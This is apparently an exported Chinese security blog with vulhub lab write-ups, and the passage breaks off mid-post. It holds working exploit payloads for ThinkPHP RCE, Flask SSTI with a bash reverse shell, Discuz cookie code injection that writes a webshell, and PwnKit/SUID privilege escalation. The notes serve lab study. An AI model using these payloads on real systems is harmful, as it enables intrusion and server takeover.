破解这个流量包的密码也可以用hashcat ssh登录12ssh dlink@192.168.88.28密码：p4ssword 先查看&#x2F;etc&#x2F;passwd有哪些系统用户 1cat etc/passwd |grep bin/bash 三、dlink提权到rootlinpeas.sh查找提权漏洞linpeas.sh脚本查找可能存在的提权漏洞 123wget 192.168.88.10:8000/linpeas.shbash linpeas.sh 法一：nohup 找到suid文件 1find / -perm -u=s -type f 2&gt;/dev/null 1./nohup /bin/sh -p -c &quot;sh -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&quot; #因为nohup在/usr/bin目录下面所以要执行nohup程序的时候要去到这个目录下面才行 同时上面的也需要注意一下执行nohup程序的之后进入的是sh shell得到root权限，但是如果在sh shell 切换成bash shell的话就没有root权限了 法二：纯内核漏洞提权 系统信息： 1234内核版本: 4.15.0-96-generic (Ubuntu 18.04.4 LTS)LinPEAS 建议的漏洞: CVE-2021-4034 (PwnKit), CVE-2021-3156 (sudo Baron Samedit)Ubuntu通杀的一个内核漏洞 les.sh脚本查找内核漏洞漏洞检测：根据 Linux 内核版本，自动查找已知的提权漏洞，并评估漏洞的利用可能性 把les.sh上传到靶机上面，注意这里上传之后要给予les.sh执行权限后面才能执行 123make #下面步骤是编译指令直接按照下面的执行即可gcc -Wall --shared -fPIC -o pwnkit.so pwnkit.cgcc -Wall cve-2021-4034.c -o cve-2021-4034 -static 1234把cve-2021-4034跟pwnkit.so上传到靶机上面，在kali把这些编译好，有时候靶机上面的环境没有编译的指令所以事先在kali编译好再上传即可，下面指令在靶机上面操作echo &quot;module UTF-8// PWNKIT// pwnkit 1&quot; &gt; gconv-modulesmkdir -p GCONV_PATH=.cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:. 这里需要cve-2021-4034，pwnkit.so，gconv-modules跟’GCONV_PATH&#x3D;.’这些文件才能执行这个漏洞 12chmod +x cve-2021-4034./cve-2021-4034 或者直接把现成的CVE-2021-4034-main上传到靶机上面然后进入这个目录赋予cve-2021-4034执行权限然后执行cve-2021-4034即可 法三：root创建全局可读可写可执行web的目录 在web目录的时候注意那些在root下面创建的文件并且这是一个全局可读可写可执行的目录！这是一个很好的提权到root机会。 注意要到files目录下面上传web shell到靶机上面，然后在攻击机上面监听，在靶机上面访问或者在kali上面访问也行 12345678LinPEAS 输出，这个进程信息在 &quot;Running processes (cleaned)&quot; 部分：╔══════════╣ Running processes (cleaned)...root 1321 0.0 0.0 4628 828 ? S 01:59 0:00 _ /bin/sh /var/www/bolt/public/bolt_start.shroot 1323 0.0 0.8 314380 18268 ? S 01:59 0:00 _ php -S 0.0.0.0:9000 -t /var/www/bolt/public/...所以根目录就是/var/www/bolt/public/，便于下面触发reverse shell 1234567891011触发 Reverse Shell从靶机内部触发（最可靠）# 在靶机上执行curl http://localhost:9000/files/reverse.php从攻击机外部触发# 在攻击机上执行curl http://192.168.88.28:9000/files/reverse.php# 使用浏览器访问在浏览器访问：http://192.168.88.28:9000/files/reverse.php 或者写入一个简单的web shell，然后kali监听就可以直接拿到root权限了 还有一些 LinPEAS 的误报其实文件不存在 1.尝试sudo权限失败 1234sudo -l(ALL) NOPASSWD: /usr/bin/TryHarder!sudo /usr/bin/TryHarder! #sudo: /usr/bin/TryHarder!: command not found 2.定时任务 文件不存在。这可能是 LinPEAS 的误报或者一个设置错误的任务。","categories":[{"name":"vulnhub","slug":"vulnhub","permalink":"http://example.com/categories/vulnhub/"}],"tags":[{"name":"nohup","slug":"nohup","permalink":"http://example.com/tags/nohup/"},{"name":"WPA-01.cap","slug":"WPA-01-cap","permalink":"http://example.com/tags/WPA-01-cap/"},{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://example.com/tags/aircrack-ng/"},{"name":"linpeas.sh","slug":"linpeas-sh","permalink":"http://example.com/tags/linpeas-sh/"},{"name":"les.sh","slug":"les-sh","permalink":"http://example.com/tags/les-sh/"}]},{"title":"Thinkphp5.0.23 rce漏洞","slug":"Thinkphp5.0.23 rce漏洞","date":"2025-09-16T01:05:10.558Z","updated":"2025-09-17T02:25:35.080Z","comments":true,"path":"2025/09/16/Thinkphp5.0.23 rce漏洞/","permalink":"http://example.com/2025/09/16/Thinkphp5.0.23%20rce%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Thinkphp5.0.23 rce漏洞位置thinkphp&#x2F;5.0.23-rce ThinkPHP 5.0.23-RCE 是一种远程代码执行漏洞，存在于 ThinkPHP 框架 5.0.23 版本及之前的版本中. 漏洞原理ThinkPHP 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名。在路由解析过程中，由于未对用户输入进行足够的过滤，恶意用户可以构造特定的 URL 请求，通过在 URL 中使用特殊字符来改变 URL 参数的解析结果，调用 Request 类任意方法并构造利用链，将恶意代码作为控制器或方法的名称，导致恶意 PHP 代码被执行。 影响范围5.0.x &lt;&#x3D; 5.0.23 以及 5.1.x &lt; 5.1.31 的 ThinkPHP 版本均受影响。 漏洞危害攻击者可利用该漏洞执行任意命令，进而实现上传木马和后门、读取敏感文件等恶意操作，获取服务器最高权限，对系统安全造成严重威胁。 漏洞复现方式通常可通过 docker 启动 vulhub 中自带的靶场进行复现。在 IP:8080&#x2F;index.php?s&#x3D;captcha 页面通过 POST 方法发送特定 payload，或使用 HackBar 插件、BurpSuite 抓包修改请求包内容等方式来利用该漏洞，实现远程代码执行。 防护措施将 ThinkPHP 框架升级到 5.0.23 以上版本或 5.1.31 以上版本，避免使用存在漏洞的版本。同时，开发人员在进行 Web 应用开发时，应对用户输入的数据进行充分的过滤与验证，防止类似漏洞发生。 开启环境 1Burpsuit抓包修改传参方式为Post，url后接入/index.php?s=captcha，传入参数为&quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=pwd&quot;，其中pwd为系统执行命令可进行一系列操作。 1/index.php?s=captcha #url后接_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=pwd #POST传入参数 替换数据包所以上网找了一下，直接替换数据包即可，然后Host替换成自己访问的IP即可，注意请求体的那个最后不要有空行，不然显示不出来 1234567891011POST /index.php?s=captcha HTTP/1.1Host: 192.168.196.128:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 72_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 参数值可以是pwd，也可以是cat &#x2F;etc&#x2F;passwd，whoami等等 写入一句话木马这里写入一句话木马的时候用单引号把php代码括起来写入，不要用双引号，密码不用引号括起来 木马成功写入，用蚁剑成功连接(因为看到当前目录是&#x2F;var&#x2F;www&#x2F;public且ls之后添加的shell.php跟index.php在同级目录下，所以确定木马文件shell.php的路径就是http://192.168.196.128:8080/shell.php) 注意有些人在上传木马的时候用双引号括起来php代码，这时候双引号的一句话木马的POST被吃掉了所以一句话木马上传不成功，自然用蚁剑连的时候也会连不上 另外一种解决办法就是采用base64编码的形式上传上去 123echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;：输出一段Base64编码的字符串。| base64 -d：通过管道将输出的Base64字符串进行解码 (-d 参数代表decode)。&gt; 1.php：将解码后的内容写入到当前目录下一个名为 1.php 的文件中 检测ThinkPHP 5.0.23远程代码执行漏洞的poc脚本12345678910111213141516171819202122232425262728293031323334#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsfrom urllib.parse import urljoin# from bs4 import BeautifulSoupdef thinkphp_5023_rce(url): # url = url+&#x27;/index.php?s=captcha&#x27; # print(url) # payload = r&#x27;_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1&#x27; # headers = &#123; # &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;, # &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, # &#125; payload = &#123; &#x27;_method&#x27;:&#x27;__construct&#x27;, &#x27;filter[]&#x27;:&#x27;phpinfo&#x27;, &#x27;method&#x27;:&#x27;get&#x27;, &#x27;server[REQUEST_METHOD]&#x27;:&#x27;1&#x27; &#125; target = urljoin(url,&#x27;/index.php?s=captcha&#x27;) # print(target) response = requests.post(target,data=payload,verify=False) print(response.text) if &#x27;PHP Version&#x27; in response.text: print(&quot;漏洞存在&quot;) else: print(&quot;漏洞不存在&quot;) if __name__ == &#x27;__main__&#x27;: url = &#x27;http://192.168.196.128:8080&#x27; thinkphp_5023_rce(url) 12vim poc.pypython3 poc.py 停止并删除容器","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"rce","slug":"rce","permalink":"http://example.com/tags/rce/"},{"name":"poc","slug":"poc","permalink":"http://example.com/tags/poc/"}]},{"title":"Flask SSTI漏洞(Flask SSTI)","slug":"Flask SSTI漏洞","date":"2025-09-15T11:59:47.060Z","updated":"2025-09-17T02:26:06.055Z","comments":true,"path":"2025/09/15/Flask SSTI漏洞/","permalink":"http://example.com/2025/09/15/Flask%20SSTI%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Flask SSTI漏洞(Flask SSTI)位置flask&#x2F;ssti&#x2F; Flask SSTI（Server-Side Template Injection，服务端模板注入）漏洞是一种由于服务器端模板引擎处理用户输入不当而导致的安全漏洞。攻击者可以通过构造恶意输入，注入并执行模板代码，从而获取敏感信息或执行任意命令。 漏洞原理Flask 是 Python 的轻量级 Web 框架，默认使用 Jinja2 作为模板引擎。当应用直接将用户输入嵌入到模板中，而未经过充分过滤或转义时，攻击者可以注入恶意的 Jinja2 表达式，导致代码执行。 例如，将下面的代码复制保存到文件1.py中，而1.py最好是在kali虚拟机里面执行，因为如果在本机执行的话有些模块没有需要安装，需要pip3 install flask安装flask。服务器端模板注入（SSTI - Server-Side Template Injection）。 12345678910111.pyfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/search&#x27;)def search(): res= request.args.get(&#x27;id&#x27;, &#x27;&#x27;) template = f&quot;Hello, &#123;res&#125;!&quot; # 直接将用户输入嵌入模板 return render_template_string(template) # 危险！if __name__ == &#x27;__main__&#x27;: app.run() 用kali里面的浏览器访问5000端口 1234567http://127.0.0.1:5000/search?id=&#123;&#123;7*7&#125;&#125;res 的值是 &#x27;&#123;&#123;7*7&#125;&#125;&#x27;。template 变量变成 f&quot;Hello, &#123;&#123;7*7&#125;&#125;!&quot;。render_template_string 函数会解析和执行 &#123;&#123;7*7&#125;&#125; 这部分模板语法，计算 7*7 的结果。页面显示：Hello, 49! 1http://127.0.0.1:5000/search?id=&#123;&#123;config&#125;&#125; // 泄露Flask配置 1http://127.0.0.1:5000/search?id=&#123;&#123;url_for.__globals__&#125;&#125; # 泄露Flask配置 如果不想只用127.0.0.1，不限制IP访问的话就可以把1.py的最后一行修改成： 1app.run(host=&#x27;0.0.0.0&#x27;,port=5005) 多了一个kali的IP访问：http://192.168.196.128:5005 ，所有跟kali互通的都可以用浏览器访问这个IP 利用 Python 的内置类和函数执行系统命令 读取系统文件1&#123;&#123; get_flashed_messages.__globals__[&#x27;os&#x27;].popen(&#x27;cat /etc/passwd&#x27;).read() &#125;&#125; 反弹shell 1&#123;&#123; get_flashed_messages.__globals__[&#x27;os&#x27;].system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.196.128/1234 0&gt;&amp;1&quot;&#x27;) &#125;&#125; //没成功 关于FLASK SSTI的CTF题目挺多的 开启环境 参考vulhub里的wp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556└─# cat README.zh-cn.md # Flask（Jinja2）服务端模板注入漏洞Flask是一个流行的Python Web框架，使用Jinja2作为其模板引擎。当用户输入未经适当过滤就直接在Jinja2模板中渲染时，可能会导致服务端模板注入（SSTI）漏洞，进而可能导致远程代码执行。参考链接：- &lt;https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf&gt;- &lt;http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates&gt;## 环境搭建执行如下命令启动一个基于Flask 1.1.1的Web应用：```docker compose up -d```环境启动后，访问`http://your-ip:8000/`即可查看到默认页面。## 漏洞复现首先，访问以下URL验证SSTI漏洞是否存在：```http://your-ip:8000/?name=&#123;&#123;233*233&#125;&#125;```如果看到结果`54289`，则证实存在SSTI漏洞。要实现远程代码执行，可以使用以下POC获取`eval`函数并执行任意Python代码：```python&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;```访问以下URL（POC已进行URL编码）执行命令：```http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D```命令执行结果将会显示：![](1.png) 1234567891011http://192.168.196.128:8000/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 停止并删除容器","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"Jinja2","slug":"Jinja2","permalink":"http://example.com/tags/Jinja2/"}]},{"title":"discuz全局变量防御绕过导致代码执行(wooyun-2010-080723)","slug":"discuz全局变量防御绕过导致代码执行","date":"2025-09-15T08:47:22.003Z","updated":"2025-09-17T02:26:44.342Z","comments":true,"path":"2025/09/15/discuz全局变量防御绕过导致代码执行/","permalink":"http://example.com/2025/09/15/discuz%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","excerpt":"","text":"discuz全局变量防御绕过导致代码执行(wooyun-2010-080723)位置discuz&#x2F;wooyun-2010-080723 参考：https://blog.csdn.net/qq_34851291/article/details/144055569 漏洞原理该漏洞的产生与 PHP 的配置参数register_globals和request_order有关。当register_globals开启时，PHP 会将来自 GET、POST、COOKIE 等外部输入的数据直接注册为全局变量。在 PHP 5.3.x 版本中，request_order配置默认为 GP（即 Get 和 Post），这意味着 Cookie 中的数据并不会被自动注册为全局变量。但在 Discuz 7.x&#x2F;6.x 中，攻击者可以在 Cookie 中设置带有恶意代码的GLOBALS变量，从而绕过全局变量防御，实现代码执行。 影响版本Discuz 6.x、7.x。 漏洞复现安装 Discuz 后，找到一个已存在的帖子，截断其数据包，在 Cookie 中添加 Payload： 1Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies] 开启环境 12345678910111213└─# cat docker-compose.yml services: discuz: image: vulhub/discuz:7.2 depends_on: - db ports: - &quot;8080:80&quot; db: image: mysql:5.5 environment: MYSQL_ROOT_PASSWORD: root MYSQL_DATABASE: discuz 直接访问会出错，需要安装 浏览器访问http://192.168.196.128:8080/install/，安装数据库。先同意授权协议，下一步安装，数据库服务器填写db，数据库名为discuz，数据库用户名和密码均为root，其他不改动。管理员密码任意，可以为admin。填写联系方式页面直接点击跳过本步后跳转到首页。 用户名admin和密码admin登录成功后进入默认板块，用一下这个论坛。 漏洞利用开启BurpSuit抓包，然后随便点击一篇贴子，BurpSuit拦截后将Cookie修改为下面，点击放包。 1Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo(); //这是一个非常经典且危险的 PHP代码注入攻击载荷（Payload），通常针对具有特定漏洞的老旧PHP程序（如Discuz!、WordPress或其他使用老旧PHP编码方式的CMS）。攻击者构造一个HTTP请求，在Cookie或POST数据中填入以上内容 12345678910111213这个字符串试图通过HTTP请求（通常是Cookie或POST数据）向服务器传递两个变量：GLOBALS[_DCACHE][smilies][searcharray]： 值为 /.*/euiGLOBALS[_DCACHE][smilies][replacearray]： 值为 phpinfo();攻击载荷解析：如何执行代码？现在，我们来看攻击者覆盖进去的值如何让这段代码变成致命漏洞：searcharray = /.*/eui.*： 正则表达式，匹配任意字符（整个字符串）。e： 这是整个攻击的核心！ 这是一个已被废弃的PCRE修饰符。它告诉 preg_replace()，在执行替换后，要将替换结果（$replace）作为PHP代码来执行。u： Unicode模式。i： 忽略大小写。replacearray = phpinfo();这是将要被执行的PHP代码。phpinfo() 是一个函数，它会输出大量关于当前PHP环境的配置信息。 条件存在危险的字符串替换操作目标程序中某处存在使用 preg_replace() 函数的代码，并且其参数正好使用了被覆盖的这两个变量 $_DCACHE[&#39;smilies&#39;][&#39;searcharray&#39;] 和 $_DCACHE[&#39;smilies&#39;][&#39;replacearray&#39;]。代码可能看起来像这样： 123456// 某处存在漏洞的代码$content = preg_replace( $_DCACHE[&#x27;smilies&#x27;][&#x27;searcharray&#x27;], // 搜索模式 $_DCACHE[&#x27;smilies&#x27;][&#x27;replacearray&#x27;], // 替换内容 $content // 要处理的文本); 1Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo(); 木马文件同样方法传入以下Cookie写入一句话木马文件，文件为x.php，密码为pwd 12# EXPCookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)) 去容器里看看 12docker-compose ps //查看当前正在运行的容器列表，确认正确的容器ID或名称docker exec -it wooyun-2010-080723-discuz-1 /bin/sh //进入容器ID为 &#x27;wooyun-2010-080723-discuz-1&#x27; 的容器内部，并打开一个交互式的 shell 终端 生成了一句话木马。蚁剑测试。http://192.168.196.128:8080/x.php poc文件ASCII码和字符互相转换的小脚本，方便修改POC的文件名和密码 123456789101112131415161718192021import re# ASCII = ord(Word)# Word = chr(ASCII)# ASCII -&gt; Worddef ASCII2word(ASCIIs): for c in re.findall(r&quot;(\\d+)&quot;, ASCIIs): print(chr(int(c)),end=&quot;&quot;)# Word -&gt; ASCIIdef word2ASCII(words): ASCIIs = &quot;&quot; for word in words: ASCIIs += &quot;Chr(&quot; + str(ord(word)) + &quot;).&quot; print(ASCIIs)asciis = &quot;Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(109).Chr(105).Chr(115).Chr(104).Chr(105).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(101).Chr(115).Chr(116).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59)&quot;ASCII2word(asciis)words = &quot;fputs(fopen(&#x27;x.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[pwd])?&gt;&#x27;);&quot;word2ASCII(words) 停止并删除容器","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"Cookie--GLOBALS","slug":"Cookie-GLOBALS","permalink":"http://example.com/tags/Cookie-GLOBALS/"},{"name":"docker交互式shell","slug":"docker交互式shell","permalink":"http://example.com/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"}]},{"title":"Nginx越界读取缓存漏洞(CVE-2017-7529)","slug":"Nginx越界读取缓存漏洞","date":"2025-09-15T08:12:41.530Z","updated":"2025-09-17T02:27:30.006Z","comments":true,"path":"2025/09/15/Nginx越界读取缓存漏洞/","permalink":"http://example.com/2025/09/15/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Nginx越界读取缓存漏洞(CVE-2017-7529)位置nginx&#x2F;CVE-2017-7529&#x2F; 下载好的文章《Nginx越界读取缓存漏洞（CVE-2017-7529）复现分析.pdf》讲得很好。https://www.cnblogs.com/qweg/p/16549957.html 漏洞概述 在 Nginx 的 range filter 中存在整数溢出漏洞，可以通过带有特殊构造的 range 的 HTTP 头的恶意请求引发这个整数溢出漏洞，来获取响应中的缓存文件头部信息。在某些配置中，缓存文件头可能包含后端服务器的IP地址或其它敏感信息，从而导致信息泄露。 影响程度攻击成本：低危害程度：低影响范围：Nginx 0.5.6 – 1.13.2 前置知识HTTP range头 断点续传 http中的range断点传输允许客户端分批次的请求资源，这样当用户网络中断时，就不需要重头开始请求，只需要在终端的那部分开始请求就好了 详细描述、语法格式等详见链接 https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Range The Range 是一个请求首部，告知服务器返回文件的哪一部分。在一个 Range 首部中，可以一次性请求多个部分，服务器会以 multipart 文件的形式将其返回。如果服务器返回的是范围响应，需要使用 206 Partial Content 状态码。假如所请求的范围不合法，那么服务器会返回 416 Range Not Satisfiable 状态码，表示客户端错误。服务器允许忽略 Range 首部，从而返回整个文件，状态码用 200 。 开启环境 运行python3 poc.py http://192.168.196.128:8080 获取了缓存文件的头部信息。 可见，响应码为206，服务器返回的是范围响应。并越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 停止并删除容器 漏洞修复12防止size累加溢出在end绝对值大于等于content_length时，start直接赋值为0，禁止越界读取","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"状态码","slug":"状态码","permalink":"http://example.com/tags/%E7%8A%B6%E6%80%81%E7%A0%81/"},{"name":"越界读取","slug":"越界读取","permalink":"http://example.com/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/"}]},{"title":"Apache HTTPD多后缀解析漏洞(apache_parsing_vulnerability)","slug":"Apache HTTPD多后缀解析漏洞","date":"2025-09-15T07:44:49.801Z","updated":"2025-09-17T02:27:10.944Z","comments":true,"path":"2025/09/15/Apache HTTPD多后缀解析漏洞/","permalink":"http://example.com/2025/09/15/Apache%20HTTPD%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Apache HTTPD多后缀解析漏洞(apache_parsing_vulnerability)位置httpd&#x2F;apache_parsing_vulnerability&#x2F; 漏洞概述Apache HTTPD 多后缀解析漏洞并非 Apache 本身的程序漏洞，而是由于配置不当导致的安全问题。Apache 支持一个文件拥有多个后缀，并会为不同的后缀执行不同的指令。如果服务器配置中启用了 PHP 解析功能（如 AddHandler application&#x2F;x-httpd-php .php），则文件只要包含 .php 后缀，就会被当作 PHP 文件解析，无论其是否为最后一个后缀。这种特性被利用后，可以绕过文件上传白名单，导致任意代码执行，严重威胁服务器安全。 漏洞原理Apache 在解析文件时，会从最后一个后缀开始逐个尝试解析。如果某个后缀无法被解析，则继续向前解析。因此，攻击者可以通过构造类似 xxx.php.xxx 的文件名，绕过文件上传的白名单限制。例如，上传一个名为 test.php.jpg 的文件，Apache 会首先尝试解析 .jpg，由于无法解析，继续向前解析 .php，最终将其当作 PHP 文件执行。 影响范围该漏洞与 Apache HTTPD 版本无关，而是与服务器配置有关。只要服务器启用了 PHP 解析功能（如 AddHandler application&#x2F;x-httpd-php .php），并且存在文件上传功能，就可能受到此漏洞的影响。 开启apache_parsing_vulnerability漏洞环境 直接上传一个.php文件，页面提示错误：“Unsupported filetype uploaded.” 接着还上传这个文件，使用burpsuit抓包修改扩展名，添加.jpg。放行后可以成功上传，“File uploaded successfully: &#x2F;var&#x2F;www&#x2F;html&#x2F;uploadfiles&#x2F;2.php.jpg”。 停止并删除容器 修复漏洞可以采取以下几种方法： （1）修改 Apache 配置 使用正则表达式或更严格的匹配方式来限制 PHP 文件的解析范围，确保只有以 .php 结尾的文件才会被解析为 PHP 文件。以下是两种修改方式： 123456方案一：使用正则表达式限制后缀在 Apache 配置文件（如 httpd.conf 或 .htaccess）中，添加以下内容：&lt;IfModule mime_module&gt; AddHandler application/x-httpd-php .php$&lt;/IfModule&gt;这里的 ^.*\\.php$ 是一个正则表达式，确保只有以 .php 结尾的文件才会被解析为 PHP 文件。 方案二：使用 SetHandler 替代 AddHandler SetHandler 比 AddHandler 更严格，它会覆盖所有匹配的文件类型，而不仅仅是添加一个处理程序。配置如下： 1234&lt;FilesMatch &quot;\\.php$&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;这种方式确保只有以 .php 结尾的文件才会被当作 PHP 文件解析。 （2）禁用多后缀解析 如果不需要支持多后缀解析功能，可以在 Apache 配置中禁用该特性，例如： 1234&lt;IfModule mime_module&gt; AddHandler application/x-httpd-php .php RemoveHandler .php&lt;/IfModule&gt; 这样，只有 .php 文件会被解析为 PHP 文件，而其他后缀的文件不会被解析。 （3）限制文件上传目录的权限 在文件上传目录中，确保没有执行权限，防止上传的文件被当作脚本执行。可以通过以下方式实现： 123456&lt;Directory /path/to/upload&gt; Options -ExecCGI &lt;FilesMatch &quot;\\.php$&quot;&gt; Deny from all &lt;/FilesMatch&gt;&lt;/Directory&gt; 这样可以确保上传目录中的 PHP 文件不会被解析。","categories":[{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"}],"tags":[{"name":"后面加.jpg后缀","slug":"后面加-jpg后缀","permalink":"http://example.com/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/"}]},{"title":"Nginx文件名解析逻辑漏洞(CVE-2013-4547)","slug":"CVE-2013-4547","date":"2025-09-15T03:09:01.222Z","updated":"2025-10-09T08:56:30.659Z","comments":true,"path":"2025/09/15/CVE-2013-4547/","permalink":"http://example.com/2025/09/15/CVE-2013-4547/","excerpt":"","text":"Nginx文件名解析逻辑漏洞(CVE-2013-4547)位置vulhub-master&#x2F;nginx&#x2F;CVE-2013-4547 原理CVE-2013-4547 是 Nginx 中存在的一个文件名解析逻辑漏洞（也称为路径遍历漏洞），允许通过特定方式绕过文件类型限制，该漏洞的核心影响是允许攻击者通过特殊编码或路径构造，使Nginx错误解析非预期文件类型（如图片文件后缀名）为PHP脚本并执行。 主要影响版本Nginx 0.8.41 至 1.4.3、1.5.0 至 1.5.7 版本。 漏洞产生处下面这段配置是Nginx服务器中用于处理PHP请求的FastCGI配置。 123456789location ~ \\.php$ &#123; root html; include fastcgi_params; fastcgi_pass php:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT /var/www/html; &#125; 每行解释如下：每行解释如下： 1234567891011121314151617location ~ \\.php$：~表示后面的匹配模式是一个正则表达式，即\\.php$ 是正则表达式；其中：\\. 匹配实际的点字符(需要转义)，php 匹配字母php，$表示字符串结尾。这行表示匹配所有以.php结尾的请求。root html：设置根目录为html文件夹include fastcgi_params：包含FastCGI的标准参数配置文件fastcgi_pass php:9000：将PHP请求转发到名为&quot;php&quot;的主机的9000端口(通常是PHP-FPM服务)fastcgi_index index.php：设置默认索引文件为index.phpfastcgi_param SCRIPT_FILENAME：指定PHP脚本的完整路径为/var/www/html加上请求的脚本名fastcgi_param 